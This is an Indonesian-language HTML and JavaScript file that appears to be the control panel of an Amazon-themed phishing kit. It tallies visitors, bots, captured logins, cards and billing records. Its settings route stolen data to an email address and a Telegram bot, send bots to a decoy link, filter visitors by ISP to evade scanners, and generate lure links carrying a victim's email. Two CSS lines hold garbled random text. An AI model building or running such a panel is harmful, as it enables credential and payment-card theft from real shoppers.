<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel Rahasia — Amazon Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Arial, sans-serif; }
        body {
            background: #050508 url('img/xchenba.png') no-repeat center center fixed;
            background-size: cover;
            color: #e0e0e0;
            min-height: 100vh;
            padding: 20px;
        }
        body::before {
            content: '';
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(5, 5, 10, 0.85);
            z-index: -1;
        }
        .wadah { max-width: 1200px; margin: 0 auto; }
        h1 { text-align: center; color: #fff; margin-bottom: 20px; font-size: 22px; }
        .kotak-besar { background: rgba(30,42EYHgEzWEdjJgYKAu8VjC4DohVYUMbvZ6Ua45MgSaYBTFv3725expKB69YsjM6Utj99E6Sn3LpcxQ4mNrwfrJLM5NGbWiQbottom: 20px; backdrop-filter: blur(8px); }
        .judul-bagian { font-size: 14px; color: #cbd5e1; margin-bottom: 15px; }
        .grid-stat { display: grid; grid-template-columns: repeat(6, 1fr); gap: 12px; }
        .kotak-stat { padding: 12px 8px; border-radius: 6px; text-align: center; }
        .kotak-stat h2 { font-size: 24px; margin-bottom: 4px; }
        .kotak-stat p { font-size: 11px; opacity: 0.85; }
        .stat-kunjungan { background: #4f46e5; }
        .stat-manusia { background: #0891b2; }
        .stat-bot { background: #db2777; }
        .stat-login { background: #d97706; }
        .stat-kartu { background: #059669; }
        .stat-tagihan { background: #7c3aed; }
        .grid-3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px 18px; }
        .kolom-penuh { grid-column: 1 / -1; }
        label { display: block; font-size: 12px; color: #cbd5e1; margin-bottom: 5px; }
        input, textarea { width: 100%; padding: 8px 10px; background: rgba(15,23,42,0.8); border: 1px solid rgba(100,116,139,0.4); border-radius: 4px; color: #e2e8f0; }
        button.tombol { width: 100%; padding: 8px; border: none; border-radius: 4px; cursor: pointer; margin-top: 6px; }
        .tombol-ungu { background: #4f46e5; color: #fff; }
        .tombol-merah { background: #dc2626; color: #fff; }
        .kotak-tautan { background: rgba(30,42EYHgEzWEdjJgYKAu8VjC4DohVYUMbvZ6Ua45MgSaYBTFv3725expKB69YsjM6Utj99E6Sn3LpcxQ4mNrwfrJLM5NGbWiQsize: 12px; color: #bfdbfe; display: none; word-break: break-all; }
        table { width: 100%; border-collapse: collapse; font-size: 12px; }
        th, td { padding: 8px 10px; text-align: left; border-bottom: 1px solid rgba(71,85,105,0.3); }
        th { color: #94a3b8; }
        .kosong { text-align: center; color: #64748b; padding: 25px; }
    </style>
</head>
<body>
<div class="wadah">
    <h1>🔐 Panel Rahasia — Amazon Verification</h1>

    <div class="kotak-besar">
        <div class="judul-bagian">📊 Statistik Pengunjung</div>
        <div class="grid-stat">
            <div class="kotak-stat stat-kunjungan"><h2 id="jml_kunjungan">0</h2><p>Total</p></div>
            <div class="kotak-stat stat-manusia"><h2 id="jml_manusia">0</h2><p>Manusia</p></div>
            <div class="kotak-stat stat-bot"><h2 id="jml_bot">0</h2><p>Bot</p></div>
            <div class="kotak-stat stat-login"><h2 id="jml_login">0</h2><p>Login</p></div>
            <div class="kotak-stat stat-kartu"><h2 id="jml_kartu">0</h2><p>Kartu</p></div>
            <div class="kotak-stat stat-tagihan"><h2 id="jml_tagihan">0</h2><p>Tagihan</p></div>
        </div>
    </div>

    <div class="kotak-besar">
        <div class="judul-bagian">⚙️ Pengaturan Sistem</div>
        <div class="grid-3">
            <div>
                <label>Nama Parameter Tautan</label>
                <input type="text" id="nama_param" value="anrew">
                <button class="tombol tombol-ungu" onclick="buatTautan()">🔗 Buat Tautan</button>
                <button class="tombol tombol-ungu" onclick="bukaTautan()">🌐 Buka Tautan</button>
                <div class="kotak-tautan" id="tautan_jadi"></div>
            </div>
            <div>
                <label>Email Tujuan</label>
                <input type="email" id="email_tujuan">
                <button class="tombol tombol-ungu" onclick="simpanEmail()">📧 Simpan Email</button>
            </div>
            <div>
                <label>Token Telegram</label>
                <input type="text" id="bot_token">
                <label style="margin-top:8px;">Chat ID</label>
                <input type="text" id="chat_id">
                <button class="tombol tombol-ungu" onclick="simpanTelegram()">📩 Simpan Telegram</button>
            </div>
            <div>
                <label>Link Pengalihan Bot</label>
                <textarea id="link_bot" rows="3"></textarea>
                <button class="tombol tombol-ungu" onclick="simpanLink()">🔗 Simpan Link</button>
            </div>
            <div>
                <label>ISP Diizinkan</label>
                <textarea id="daftar_izin" rows="3"></textarea>
                <button class="tombol tombol-ungu" onclick="simpanIzin()">✅ Simpan Izinkan</button>
            </div>
            <div>
                <label>ISP Diblokir</label>
                <textarea id="daftar_blokir" rows="3"></textarea>
                <button class="tombol tombol-ungu" onclick="simpanBlokir()">🚫 Simpan Blokir</button>
            </div>
            <div class="kolom-penuh">
                <label>Cek IP</label>
                <div style="display:flex;gap:8px;">
                    <input type="text" id="cek_ip" style="flex:1;">
                    <button class="tombol tombol-ungu" style="width:auto;margin:0;" onclick="cekIP()">Cek</button>
                </div>
            </div>
            <div class="kolom-penuh">
                <button class="tombol tombol-merah" onclick="hapusSemua()">⚠️ Hapus Semua Data</button>
            </div>
        </div>
    </div>

    <div class="kotak-besar">
        <div class="judul-bagian">📋 Riwayat Pengunjung</div>
        <table>
            <thead><tr><th>IP</th><th>Negara</th><th>ISP</th><th>Status</th><th>Alasan</th><th>Waktu</th></tr></thead>
            <tbody id="daftar_riwayat"><tr><td colspan="6" class="kosong">Belum ada data</td></tr></tbody>
        </table>
    </div>
</div>

<script>
const API_URL = "/panel_api";
let tautanSiap = "";

window.onload = async () => {
    const res = await fetch(API_URL);
    const d = await res.json();
    document.getElementById("jml_kunjungan").textContent = d.jml_kunjungan || 0;
    document.getElementById("jml_manusia").textContent = d.jml_manusia || 0;
    document.getElementById("jml_bot").textContent = d.jml_bot || 0;
    document.getElementById("jml_login").textContent = d.jml_login || 0;
    document.getElementById("jml_kartu").textContent = d.jml_kartu || 0;
    document.getElementById("jml_tagihan").textContent = d.jml_tagihan || 0;
    document.getElementById("email_tujuan").value = d.email_tujuan || "";
    tautanSiap = localStorage.getItem("tautanTerakhir") || "";
    if(tautanSiap) { document.getElementById("tautan_jadi").style.display = "block"; document.getElementById("tautan_jadi").textContent = tautanSiap; }
    tampilkanRiwayat(d.riwayat || []);
};

function buatTautan() {
    const namaParam = document.getElementById("nama_param").value.trim() || "anrew";
    const email = prompt("Masukkan email:");
    if(!email) return;
    tautanSiap = `${window.location.origin}/?${namaParam}=${encodeURIComponent(email)}`;
    document.getElementById("tautan_jadi").style.display = "block";
    document.getElementById("tautan_jadi").textContent = tautanSiap;
    localStorage.setItem("tautanTerakhir", tautanSiap);
    navigator.clipboard.writeText(tautanSiap);
    alert("✅ Tautan disalin & tersimpan!");
}
function bukaTautan() { if(!tautanSiap) alert("Buat dulu!"); else window.open(tautanSiap, "_blank"); }

async function simpanEmail() {
    await fetch(API_URL, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({aksi:"simpan_email", email:document.getElementById("email_tujuan").value}) });
    alert("✅ Tersimpan!");
}
async function hapusSemua() {
    if(!confirm("Yakin?")) return;
    await fetch(API_URL, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({aksi:"hapus_semua"}) });
    localStorage.removeItem("tautanTerakhir"); location.reload();
}

function tampilkanRiwayat(riwayat) {
    const wadah = document.getElementById("daftar_riwayat");
    if(!riwayat.length) { wadah.innerHTML = `<tr><td colspan="6" class="kosong">Belum ada data</td></tr>`; return; }
    wadah.innerHTML = riwayat.reverse().map(r => `<tr><td>${r.ip||"-"}</td><td>${r.negara||"-"}</td><td>${r.isp||"-"}</td><td>${r.status||"BOT"}</td><td>${r.alasan||"-"}</td><td>${r.waktu||"-"}</td></tr>`).join("");
}
async function cekIP() {
    const ip = document.getElementById("cek_ip").value.trim();
    if(!ip) return;
    try { const d = await(await fetch(`https://ipapi.co/${ip}/json/`)).json(); alert(`IP: ${d.ip}\nNegara: ${d.country_name}\nISP: ${d.org}`); }
    catch { alert("Gagal cek IP"); }
}
</script>
</body>
</html>
